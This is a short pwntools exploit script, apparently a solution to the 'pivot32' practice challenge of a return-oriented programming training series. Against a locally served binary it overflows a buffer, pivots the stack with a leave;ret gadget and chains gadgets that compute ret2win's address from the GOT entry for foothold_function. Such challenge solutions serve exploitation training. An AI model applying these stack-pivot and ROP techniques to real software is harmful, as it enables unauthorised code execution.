from pwn import *

#b = ELF('./pivot32')
#libc = ELF('./libpivot32.so')


leaveret = p32(0x0804889f)
xchgeaxesp = p32(0x080488c2)
popeax = p32(0x080488c0)
puts = p32(0x080485d0)
foothold = p32(0x080485f0)
bss = p32(0x804a03c)
pwnme = p32(0x080487f2)
libpivotret2win = p32(0x00000967)
libpivotfoothold = p32(0x00000770)
popeax = p32(0x080488c0)
moveaxptr = p32(0x080488c4)
addeaxebx = p32(0x080488c7)
popebx = p32(0x08048571)
jmpeax = p32(0x08048a5f)
gotfoothold  = p32(0x0804a024)

p = remote('127.0.0.1',1234)
p.recvuntil(': ')
pivot = p.recvuntil('\n')
pivot = pivot.replace('\n','')
pivot = int(pivot,16)
log.info("Pivot address : " + hex(pivot))
#1f7 is the difference between ret2win and foothold in libpivot
log.info("Sending first payload")
p.recvline()
p.sendline( foothold + popeax + gotfoothold + moveaxptr + popebx + p32(0x1f7) + addeaxebx + jmpeax)
payload = "A"*40 + p32(pivot-0x4) + leaveret
p.recvline()
log.info("Sending second payload pivot")
p.sendline(payload)
p.recv()
p.recv()
print p.recv()
